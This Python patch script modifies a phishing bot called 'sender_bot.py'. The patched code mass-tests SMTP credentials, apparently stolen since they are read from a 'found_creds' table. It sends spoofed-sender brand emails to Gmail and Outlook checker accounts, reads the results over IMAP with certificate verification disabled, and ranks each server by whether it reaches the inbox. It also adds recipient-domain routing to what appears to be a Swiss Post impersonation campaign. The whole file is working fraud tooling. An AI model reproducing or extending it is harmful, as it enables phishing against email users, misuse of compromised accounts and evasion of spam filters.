#!/usr/bin/env python3
"""
Patch sender_bot.py — Dual IMAP check (Gmail + Outlook) + Smart Campaign Routing.

Changes:
1. _bg_mass_imap_check: sends to BOTH Gmail AND Outlook, checks both IMAPs
2. Classification: SPOOF_INBOX_GMAIL, SPOOF_INBOX_OUTLOOK, SPOOF_INBOX_BOTH etc.
3. _run_swisspost_campaign: smart routing based on recipient domain
4. _smtp_health_check_loop: also checks Outlook
"""
import re

BOT_FILE = "/opt/darkvasend/auditguard/sender_bot.py"

with open(BOT_FILE, "r") as f:
    content = f.read()

# ============================================================
# PATCH 1: Update _bg_mass_imap_check to send to BOTH checkers
# ============================================================

# Find the function and replace it entirely
old_func_start = "async def _bg_mass_imap_check("
old_func_end_marker = '    print(f"[MASS IMAP] DONE '

start_idx = content.find(old_func_start)
end_idx = content.find(old_func_end_marker)
if end_idx != -1:
    # Find the actual end of that print line
    end_line = content.find("\n", end_idx)
    if end_line != -1:
        end_idx = end_line + 1

if start_idx == -1 or end_idx == -1:
    print(f"ERROR: Could not find _bg_mass_imap_check (start={start_idx}, end={end_idx})")
    exit(1)

NEW_BG_MASS_IMAP = '''async def _bg_mass_imap_check(
    bot, chat_id: int, smtp_list: list, tpl: dict,
    checker_email: str, brand_name: str, max_workers: int,
):
    """
    Background DUAL MODE mass check — Gmail + Outlook.
    Each SMTP is tested against BOTH checkers.
    Classification: SPOOF_INBOX_GMAIL, SPOOF_INBOX_OUTLOOK, SPOOF_INBOX_BOTH etc.
    """
    from .imap_checker import (
        GMAIL_CHECKER, is_gmail_checker_configured,
        is_outlook_checker_configured, get_outlook_checker_email,
        batch_outlook_imap,
    )
    from concurrent.futures import ThreadPoolExecutor
    import threading
    import uuid as _uuid

    has_outlook = is_outlook_checker_configured()
    outlook_email = get_outlook_checker_email() if has_outlook else ""

    total = len(smtp_list)
    lock = threading.Lock()
    stats = {
        "spoof_sent_gmail": 0, "spoof_sent_outlook": 0,
        "basique_sent_gmail": 0, "basique_sent_outlook": 0,
        "auth_fail": 0,
        "spoof_fail": 0, "basique_fail": 0,
        # markers: {marker: smtp_dict}
        "markers_spoof_gmail": {}, "markers_spoof_outlook": {},
        "markers_basique_gmail": {}, "markers_basique_outlook": {},
    }
    start_time = time.time()

    def _test_one_dual(idx: int, s: dict):
        """Send SPOOF + BASIQUE to Gmail AND Outlook for one SMTP."""
        from .campaign_sender import send_clean

        smtp_config = {
            "host": s["host"], "port": s["port"],
            "username": s["user"], "password": s["password"],
            "from_email": s["user"],
        }

        auth_dead = False

        # === GMAIL: SPOOF + BASIQUE ===
        marker_sg = f"SG-{_uuid.uuid4().hex[:8]}"
        tracked_sg = f"{tpl['subject']} [{marker_sg}]"
        try:
            r_sg = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                              checker_email, tracked_sg, tpl["html"], tpl.get("reply_to", ""), None)
            ok_sg = r_sg["success"]
            err_sg = r_sg.get("error", "")
        except Exception as e:
            ok_sg, err_sg = False, str(e)[:40]

        if "AUTH" in (err_sg or ""):
            with lock:
                stats["auth_fail"] += 1
            return

        marker_bg = f"BG-{_uuid.uuid4().hex[:8]}"
        basique_from = _build_basique_from(s["user"], brand_name)
        tracked_bg = f"{tpl['subject']} [{marker_bg}]"
        try:
            r_bg = send_clean(smtp_config, tpl["from_name"], basique_from,
                              checker_email, tracked_bg, tpl["html"], tpl.get("reply_to", ""), None)
            ok_bg = r_bg["success"]
        except Exception:
            ok_bg = False

        # === OUTLOOK: SPOOF + BASIQUE ===
        ok_so = ok_bo = False
        marker_so = marker_bo = ""
        if has_outlook and outlook_email:
            marker_so = f"SO-{_uuid.uuid4().hex[:8]}"
            tracked_so = f"{tpl['subject']} [{marker_so}]"
            try:
                r_so = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                                  outlook_email, tracked_so, tpl["html"], tpl.get("reply_to", ""), None)
                ok_so = r_so["success"]
            except Exception:
                ok_so = False

            marker_bo = f"BO-{_uuid.uuid4().hex[:8]}"
            tracked_bo = f"{tpl['subject']} [{marker_bo}]"
            try:
                r_bo = send_clean(smtp_config, tpl["from_name"], basique_from,
                                  outlook_email, tracked_bo, tpl["html"], tpl.get("reply_to", ""), None)
                ok_bo = r_bo["success"]
            except Exception:
                ok_bo = False

        with lock:
            if ok_sg:
                stats["spoof_sent_gmail"] += 1
                stats["markers_spoof_gmail"][marker_sg] = s
            else:
                stats["spoof_fail"] += 1
            if ok_bg:
                stats["basique_sent_gmail"] += 1
                stats["markers_basique_gmail"][marker_bg] = s
            else:
                stats["basique_fail"] += 1
            if ok_so:
                stats["spoof_sent_outlook"] += 1
                stats["markers_spoof_outlook"][marker_so] = s
            if ok_bo:
                stats["basique_sent_outlook"] += 1
                stats["markers_basique_outlook"][marker_bo] = s

            done_now = stats["spoof_sent_gmail"] + stats["spoof_fail"] + stats["auth_fail"]
            if done_now % 25 == 0:
                print(f"[MASS IMAP] {done_now}/{total} — gmail_spoof:{stats['spoof_sent_gmail']} outlook_spoof:{stats['spoof_sent_outlook']} auth_fail:{stats['auth_fail']}", flush=True)

    async def _send(text):
        try:
            await bot.send_message(chat_id=chat_id, text=text[:4000])
        except Exception:
            pass

    # === PHASE 1: Send to both checkers ===
    executor = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="dual")
    futures = [executor.submit(_test_one_dual, i, s) for i, s in enumerate(smtp_list)]

    last_progress = 0
    while True:
        await asyncio.sleep(2)
        with lock:
            done_approx = stats["spoof_sent_gmail"] + stats["spoof_fail"] + stats["auth_fail"]
        if done_approx >= total:
            break
        if done_approx - last_progress >= 10:
            last_progress = done_approx
            elapsed = time.time() - start_time
            rate = done_approx / elapsed if elapsed > 0 else 0
            eta = int((total - done_approx) / rate) if rate > 0 else 0
            outlook_info = f" | OTL spoof:{stats['spoof_sent_outlook']}" if has_outlook else ""
            await _send(
                f"IMAP CHECK: {done_approx}/{total} ({rate:.1f}/s) ETA ~{eta}s\\n"
                f"GMAIL spoof:{stats['spoof_sent_gmail']} bas:{stats['basique_sent_gmail']}{outlook_info}\\n"
                f"AUTH FAIL: {stats['auth_fail']}"
            )

    executor.shutdown(wait=True)
    phase1_time = time.time() - start_time

    total_gmail = len(stats["markers_spoof_gmail"]) + len(stats["markers_basique_gmail"])
    total_outlook = len(stats["markers_spoof_outlook"]) + len(stats["markers_basique_outlook"])
    total_markers = total_gmail + total_outlook

    await _send(
        f"PHASE 1 TERMINEE — {phase1_time:.0f}s\\n\\n"
        f"GMAIL: spoof={stats['spoof_sent_gmail']} basique={stats['basique_sent_gmail']}\\n"
        f"OUTLOOK: spoof={stats['spoof_sent_outlook']} basique={stats['basique_sent_outlook']}\\n"
        f"Auth fail: {stats['auth_fail']}\\n\\n"
        f"PHASE 2: Attente 90s pour delivery..."
    )

    if total_markers == 0:
        await _send("Aucun mail envoye — rien a checker.")
        return

    await asyncio.sleep(90)

    # === PHASE 3: Check BOTH IMAPs ===
    await _send(f"PHASE 3: Check IMAP (Gmail:{total_gmail} Outlook:{total_outlook})...")

    # --- Gmail batch check ---
    gmail_markers = list(stats["markers_spoof_gmail"].keys()) + list(stats["markers_basique_gmail"].keys())

    def _batch_gmail(markers_to_check):
        import imaplib, ssl as _ssl
        results = {}
        try:
            ctx_ssl = _ssl.create_default_context()
            ctx_ssl.check_hostname = False
            ctx_ssl.verify_mode = _ssl.CERT_NONE
            imap = imaplib.IMAP4_SSL(GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
                                      ssl_context=ctx_ssl, timeout=30)
            imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])
            # SPAM first
            try:
                st, _ = imap.select("[Gmail]/Spam", readonly=True)
                if st == "OK":
                    for m in markers_to_check:
                        st2, ids = imap.search(None, f'SUBJECT "{m}"')
                        if st2 == "OK" and ids[0] and ids[0].strip():
                            results[m] = "spam"
            except Exception:
                pass
            remaining = [m for m in markers_to_check if m not in results]
            if remaining:
                try:
                    st, _ = imap.select("INBOX", readonly=True)
                    if st == "OK":
                        for m in remaining:
                            st2, ids = imap.search(None, f'SUBJECT "{m}"')
                            if st2 == "OK" and ids[0] and ids[0].strip():
                                results[m] = "inbox"
                except Exception:
                    pass
            imap.logout()
        except Exception as e:
            print(f"[MASS IMAP] Gmail error: {e}")
        return results

    gmail_results = await asyncio.to_thread(_batch_gmail, gmail_markers) if gmail_markers else {}

    # --- Outlook batch check ---
    outlook_markers = list(stats["markers_spoof_outlook"].keys()) + list(stats["markers_basique_outlook"].keys())
    outlook_results = {}
    if outlook_markers and has_outlook:
        outlook_results = await asyncio.to_thread(batch_outlook_imap, outlook_markers)

    # Retry missing after 30s
    gmail_missing = [m for m in gmail_markers if m not in gmail_results]
    outlook_missing = [m for m in outlook_markers if m not in outlook_results]
    if gmail_missing or outlook_missing:
        await _send(f"Retry: Gmail {len(gmail_missing)} / Outlook {len(outlook_missing)} manquants...")
        await asyncio.sleep(30)
        if gmail_missing:
            r2 = await asyncio.to_thread(_batch_gmail, gmail_missing)
            gmail_results.update(r2)
        if outlook_missing and has_outlook:
            r2 = await asyncio.to_thread(batch_outlook_imap, outlook_missing)
            outlook_results.update(r2)

    # === DOUBLE-CHECK INBOX markers in SPAM after 45s ===
    gmail_inbox = [m for m, v in gmail_results.items() if v == "inbox"]
    outlook_inbox = [m for m, v in outlook_results.items() if v == "inbox"]
    if gmail_inbox or outlook_inbox:
        await _send(f"DOUBLE-CHECK: Gmail {len(gmail_inbox)} + Outlook {len(outlook_inbox)} INBOX...")
        await asyncio.sleep(45)
        if gmail_inbox:
            recheck = await asyncio.to_thread(_batch_gmail, gmail_inbox)
            # Only reclassify if now found in spam
            for m in gmail_inbox:
                if m in recheck and recheck[m] == "spam":
                    gmail_results[m] = "spam"
        if outlook_inbox and has_outlook:
            def _recheck_outlook_spam(markers):
                results = {}
                try:
                    from .imap_checker import _connect_outlook_imap, OUTLOOK_CHECKER
                    imap = _connect_outlook_imap(timeout=30)
                    st, _ = imap.select(OUTLOOK_CHECKER["spam_folder"], readonly=True)
                    if st == "OK":
                        for m in markers:
                            st2, ids = imap.search(None, f'SUBJECT "{m}"')
                            if st2 == "OK" and ids[0] and ids[0].strip():
                                results[m] = "spam"
                    imap.logout()
                except Exception:
                    pass
                return results
            recheck_otl = await asyncio.to_thread(_recheck_outlook_spam, outlook_inbox)
            for m in outlook_inbox:
                if m in recheck_otl and recheck_otl[m] == "spam":
                    outlook_results[m] = "spam"

    # === CLASSIFY per provider ===
    smtp_results = {}  # key -> {smtp, gmail_spoof, gmail_basique, outlook_spoof, outlook_basique}

    def _key(s):
        return f"{s['host']}:{s['port']}|{s['user']}"

    for marker, s in stats["markers_spoof_gmail"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["gmail_spoof"] = gmail_results.get(marker, "nf")

    for marker, s in stats["markers_basique_gmail"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["gmail_basique"] = gmail_results.get(marker, "nf")

    for marker, s in stats["markers_spoof_outlook"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["outlook_spoof"] = outlook_results.get(marker, "nf")

    for marker, s in stats["markers_basique_outlook"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["outlook_basique"] = outlook_results.get(marker, "nf")

    # Build classification label per SMTP
    # Format: SPOOF_INBOX_GMAIL, SPOOF_INBOX_OUTLOOK, SPOOF_INBOX_BOTH, etc.
    categories = {
        "SPOOF_INBOX_GMAIL": [], "SPOOF_INBOX_OUTLOOK": [], "SPOOF_INBOX_BOTH": [],
        "SPOOF_SPAM_GMAIL": [], "SPOOF_SPAM_OUTLOOK": [],
        "BASIQUE_INBOX_GMAIL": [], "BASIQUE_INBOX_OUTLOOK": [], "BASIQUE_INBOX_BOTH": [],
        "BASIQUE_SPAM_GMAIL": [], "BASIQUE_SPAM_OUTLOOK": [],
        "DEAD": [],
    }

    for key, info in smtp_results.items():
        s = info["smtp"]
        gs = info["gmail_spoof"]
        gb = info["gmail_basique"]
        os_r = info["outlook_spoof"]
        ob = info["outlook_basique"]

        # Determine best category
        gmail_inbox_spoof = gs == "inbox"
        gmail_inbox_basique = gb == "inbox"
        outlook_inbox_spoof = os_r == "inbox"
        outlook_inbox_basique = ob == "inbox"
        gmail_spam_spoof = gs == "spam"
        outlook_spam_spoof = os_r == "spam"

        label_parts = []

        # SPOOF classification
        if gmail_inbox_spoof and outlook_inbox_spoof:
            categories["SPOOF_INBOX_BOTH"].append(s)
            label_parts.append("SPOOF_INBOX_BOTH")
        elif gmail_inbox_spoof:
            categories["SPOOF_INBOX_GMAIL"].append(s)
            label_parts.append("SPOOF_INBOX_GMAIL")
        elif outlook_inbox_spoof:
            categories["SPOOF_INBOX_OUTLOOK"].append(s)
            label_parts.append("SPOOF_INBOX_OUTLOOK")
        elif gmail_spam_spoof:
            categories["SPOOF_SPAM_GMAIL"].append(s)
            label_parts.append("SPOOF_SPAM_GMAIL")
        elif outlook_spam_spoof:
            categories["SPOOF_SPAM_OUTLOOK"].append(s)
            label_parts.append("SPOOF_SPAM_OUTLOOK")
        # BASIQUE fallback
        elif gmail_inbox_basique and outlook_inbox_basique:
            categories["BASIQUE_INBOX_BOTH"].append(s)
            label_parts.append("BASIQUE_INBOX_BOTH")
        elif gmail_inbox_basique:
            categories["BASIQUE_INBOX_GMAIL"].append(s)
            label_parts.append("BASIQUE_INBOX_GMAIL")
        elif outlook_inbox_basique:
            categories["BASIQUE_INBOX_OUTLOOK"].append(s)
            label_parts.append("BASIQUE_INBOX_OUTLOOK")
        elif gb == "spam":
            categories["BASIQUE_SPAM_GMAIL"].append(s)
            label_parts.append("BASIQUE_SPAM_GMAIL")
        elif ob == "spam":
            categories["BASIQUE_SPAM_OUTLOOK"].append(s)
            label_parts.append("BASIQUE_SPAM_OUTLOOK")
        else:
            categories["DEAD"].append(s)
            continue

        # Save to DB with provider-specific label
        best_label = label_parts[0] if label_parts else "AUTRE"
        _add_manual_smtp({**s, "label": f"{best_label}_{s['label']}"})

    elapsed = time.time() - start_time

    # Build report
    report = [
        "=" * 40,
        "  MASS IMAP CHECK — DUAL (Gmail+Outlook)",
        "=" * 40,
        "",
        f"Template: {tpl['brand']}",
        f"Gmail checker: {checker_email}",
        f"Outlook checker: {outlook_email or 'N/A'}",
        f"Total: {total} | Temps: {elapsed:.0f}s",
        "",
        "--- RESULTATS ---",
    ]

    for cat_name in ["SPOOF_INBOX_BOTH", "SPOOF_INBOX_GMAIL", "SPOOF_INBOX_OUTLOOK",
                      "SPOOF_SPAM_GMAIL", "SPOOF_SPAM_OUTLOOK",
                      "BASIQUE_INBOX_BOTH", "BASIQUE_INBOX_GMAIL", "BASIQUE_INBOX_OUTLOOK",
                      "BASIQUE_SPAM_GMAIL", "BASIQUE_SPAM_OUTLOOK", "DEAD"]:
        items = categories[cat_name]
        if items:
            report.append(f"\\n=== {cat_name} ({len(items)}) ===")
            for s in items[:10]:
                report.append(f"  {s['label']} | {s['host']}:{s['port']} | {s['user']}")
            if len(items) > 10:
                report.append(f"  ... +{len(items) - 10}")

    report.append(f"\\nAUTH FAIL: {stats['auth_fail']}")

    total_good = sum(len(v) for k, v in categories.items() if k != "DEAD")
    if total_good:
        report.append(f"\\n{total_good} SMTP ajoutes a MES SMTP!")
    else:
        report.append("\\nAUCUN SMTP LIVRE.")

    final_text = "\\n".join(report)
    if len(final_text) > 4000:
        final_text = final_text[:4000] + "\\n..."
    await _send(final_text)
    print(f"[MASS IMAP] DONE — {total} SMTP, {elapsed:.0f}s", flush=True)
'''

content = content[:start_idx] + NEW_BG_MASS_IMAP + "\n\n" + content[end_idx:]
print(f"PATCH 1 OK: _bg_mass_imap_check replaced")


# ============================================================
# PATCH 2: Update _classify_smtp to recognize new categories
# ============================================================

old_classify = '''def _classify_smtp(s: dict) -> str:
    """Classify SMTP into 5 categories based on context field."""
    ctx = (s.get("context") or "")
    if "SPOOF_INBOX_" in ctx:
        return "SPOOF_INBOX"
    elif "SPOOF_SPAM_" in ctx or ("SPOOF_" in ctx and "BASIQUE" not in ctx and "INBOX" not in ctx):
        return "SPOOF_SPAM"
    elif "BASIQUE_INBOX_" in ctx:
        return "BASIQUE_INBOX"
    elif "BASIQUE_SPAM_" in ctx or ("BASIQUE_" in ctx and "INBOX" not in ctx):
        return "BASIQUE_SPAM"
    return "AUTRE"'''

new_classify = '''def _classify_smtp(s: dict) -> str:
    """Classify SMTP based on context field. Supports provider-specific categories."""
    ctx = (s.get("context") or "")
    # Provider-specific inbox
    if "SPOOF_INBOX_BOTH" in ctx:
        return "SPOOF_INBOX_BOTH"
    elif "SPOOF_INBOX_GMAIL" in ctx:
        return "SPOOF_INBOX_GMAIL"
    elif "SPOOF_INBOX_OUTLOOK" in ctx:
        return "SPOOF_INBOX_OUTLOOK"
    elif "SPOOF_INBOX_" in ctx:
        return "SPOOF_INBOX"
    elif "SPOOF_SPAM_GMAIL" in ctx:
        return "SPOOF_SPAM_GMAIL"
    elif "SPOOF_SPAM_OUTLOOK" in ctx:
        return "SPOOF_SPAM_OUTLOOK"
    elif "SPOOF_SPAM_" in ctx or ("SPOOF_" in ctx and "BASIQUE" not in ctx and "INBOX" not in ctx):
        return "SPOOF_SPAM"
    elif "BASIQUE_INBOX_BOTH" in ctx:
        return "BASIQUE_INBOX_BOTH"
    elif "BASIQUE_INBOX_GMAIL" in ctx:
        return "BASIQUE_INBOX_GMAIL"
    elif "BASIQUE_INBOX_OUTLOOK" in ctx:
        return "BASIQUE_INBOX_OUTLOOK"
    elif "BASIQUE_INBOX_" in ctx:
        return "BASIQUE_INBOX"
    elif "BASIQUE_SPAM_" in ctx or ("BASIQUE_" in ctx and "INBOX" not in ctx):
        return "BASIQUE_SPAM"
    return "AUTRE"'''

if old_classify in content:
    content = content.replace(old_classify, new_classify)
    print("PATCH 2 OK: _classify_smtp updated")
else:
    print("PATCH 2 SKIP: _classify_smtp not found as expected")


# ============================================================
# PATCH 3: Update _CAT_CONFIG and _CAT_ORDER for new categories
# ============================================================

old_cat = '''_CAT_CONFIG = {
    "SPOOF_INBOX": ("SI", "SPOOF INBOX"),
    "SPOOF_SPAM":  ("SS", "SPOOF SPAM"),
    "BASIQUE_INBOX": ("BI", "BASIQUE INBOX"),
    "BASIQUE_SPAM":  ("BS", "BASIQUE SPAM"),
    "AUTRE":       ("", "AUTRE"),
}
_CAT_ORDER = ["SPOOF_INBOX", "SPOOF_SPAM", "BASIQUE_INBOX", "BASIQUE_SPAM", "AUTRE"]'''

new_cat = '''_CAT_CONFIG = {
    "SPOOF_INBOX_BOTH": ("SIB", "SPOOF INBOX BOTH"),
    "SPOOF_INBOX_GMAIL": ("SIG", "SPOOF INBOX GMAIL"),
    "SPOOF_INBOX_OUTLOOK": ("SIO", "SPOOF INBOX OUTLOOK"),
    "SPOOF_INBOX": ("SI", "SPOOF INBOX"),
    "SPOOF_SPAM_GMAIL": ("SSG", "SPOOF SPAM GMAIL"),
    "SPOOF_SPAM_OUTLOOK": ("SSO", "SPOOF SPAM OUTLOOK"),
    "SPOOF_SPAM":  ("SS", "SPOOF SPAM"),
    "BASIQUE_INBOX_BOTH": ("BIB", "BASIQUE INBOX BOTH"),
    "BASIQUE_INBOX_GMAIL": ("BIG", "BASIQUE INBOX GMAIL"),
    "BASIQUE_INBOX_OUTLOOK": ("BIO", "BASIQUE INBOX OUTLOOK"),
    "BASIQUE_INBOX": ("BI", "BASIQUE INBOX"),
    "BASIQUE_SPAM":  ("BS", "BASIQUE SPAM"),
    "AUTRE":       ("", "AUTRE"),
}
_CAT_ORDER = [
    "SPOOF_INBOX_BOTH", "SPOOF_INBOX_GMAIL", "SPOOF_INBOX_OUTLOOK", "SPOOF_INBOX",
    "SPOOF_SPAM_GMAIL", "SPOOF_SPAM_OUTLOOK", "SPOOF_SPAM",
    "BASIQUE_INBOX_BOTH", "BASIQUE_INBOX_GMAIL", "BASIQUE_INBOX_OUTLOOK", "BASIQUE_INBOX",
    "BASIQUE_SPAM", "AUTRE",
]'''

if old_cat in content:
    content = content.replace(old_cat, new_cat)
    print("PATCH 3 OK: _CAT_CONFIG/_CAT_ORDER updated")
else:
    print("PATCH 3 SKIP: _CAT_CONFIG not found as expected")


# ============================================================
# PATCH 4: Smart campaign routing — pick SMTP based on recipient domain
# ============================================================
# Find _pick_best_smtp in _run_swisspost_campaign and add domain-aware logic

old_pick = '''    def _pick_best_smtp(all_smtp):
        """Pick SMTP with lowest usage, not in cooldown, not dead, under daily limit."""
        now = time.time()
        candidates = []
        with lock:
            for s in all_smtp:
                sid = s["id"]
                if sid in stats["dead_smtps"]:
                    continue
                h = smtp_health.get(sid, {})
                if h.get("cooldown_until", 0) > now:
                    continue  # In cooldown — skip
                # Score: prefer less used + less failed
                score = h.get("sent", 0) * 2 + h.get("fails", 0) * 5
                candidates.append((score, s))
        if not candidates:
            return None
        candidates.sort(key=lambda x: x[0])
        return candidates[0][1]'''

new_pick = '''    def _get_recipient_provider(email):
        """Detect if recipient is Gmail or Outlook/Hotmail."""
        domain = email.split("@")[1].lower() if "@" in email else ""
        if domain in ("gmail.com", "googlemail.com"):
            return "gmail"
        elif domain in ("hotmail.com", "hotmail.fr", "hotmail.co.uk", "hotmail.de",
                        "outlook.com", "outlook.fr", "outlook.de",
                        "live.com", "live.fr", "live.co.uk", "live.de",
                        "msn.com"):
            return "outlook"
        return "other"

    def _get_smtp_provider_affinity(cred_id):
        """Get which email providers this SMTP is good for based on its context label."""
        import sqlite3 as _sql2
        try:
            _db2 = _sql2.connect(db_path, timeout=5)
            row = _db2.execute("SELECT context FROM found_creds WHERE id=?", (cred_id,)).fetchone()
            _db2.close()
            if row:
                ctx = row[0] or ""
                affinities = set()
                if "INBOX_BOTH" in ctx:
                    affinities.update(["gmail", "outlook"])
                if "INBOX_GMAIL" in ctx or "INBOX" in ctx:
                    affinities.add("gmail")
                if "INBOX_OUTLOOK" in ctx:
                    affinities.add("outlook")
                return affinities
        except Exception:
            pass
        return set()

    # Cache smtp affinities to avoid DB hits per recipient
    _smtp_affinity_cache = {}
    for s in smtp_list:
        _smtp_affinity_cache[s["id"]] = _get_smtp_provider_affinity(s["cred_id"])

    def _pick_best_smtp(all_smtp, recipient_provider="other"):
        """Pick SMTP with best affinity for recipient provider, lowest usage, not dead."""
        now = time.time()
        perfect = []  # SMTP that inbox on this provider
        fallback = []  # Any available SMTP
        with lock:
            for s in all_smtp:
                sid = s["id"]
                if sid in stats["dead_smtps"]:
                    continue
                h = smtp_health.get(sid, {})
                if h.get("cooldown_until", 0) > now:
                    continue
                score = h.get("sent", 0) * 2 + h.get("fails", 0) * 5
                affinity = _smtp_affinity_cache.get(sid, set())
                if recipient_provider in affinity:
                    perfect.append((score, s))
                fallback.append((score, s))
        # Prefer perfect match, fall back to any
        candidates = perfect if perfect else fallback
        if not candidates:
            return None
        candidates.sort(key=lambda x: x[0])
        return candidates[0][1]'''

if old_pick in content:
    content = content.replace(old_pick, new_pick)
    print("PATCH 4 OK: _pick_best_smtp with smart routing")
else:
    print("PATCH 4 SKIP: _pick_best_smtp not found as expected")

# Also update the call to _pick_best_smtp to pass recipient_provider
old_call1 = '            smtp = _pick_best_smtp([s for s in all_smtp if s["id"] not in tried])'
new_call1 = '            smtp = _pick_best_smtp([s for s in all_smtp if s["id"] not in tried], rcpt_prov)'
if old_call1 in content:
    content = content.replace(old_call1, new_call1, 1)
    print("PATCH 4b OK: first _pick_best_smtp call updated")

old_call2 = '                    smtp = _pick_best_smtp(all_smtp)'
new_call2 = '                    smtp = _pick_best_smtp(all_smtp, rcpt_prov)'
if old_call2 in content:
    content = content.replace(old_call2, new_call2, 1)
    print("PATCH 4c OK: second _pick_best_smtp call updated")

# Add recipient provider detection at the start of _send_one_recipient
old_send_one = '        to_email = recipient["email"]\n        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)'
new_send_one = '        to_email = recipient["email"]\n        rcpt_prov = _get_recipient_provider(to_email)\n        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)'
if old_send_one in content:
    content = content.replace(old_send_one, new_send_one, 1)
    print("PATCH 4d OK: recipient provider detection added")


# Write back
with open(BOT_FILE, "w") as f:
    f.write(content)

print(f"\nAll patches applied! File size: {len(content)} bytes")
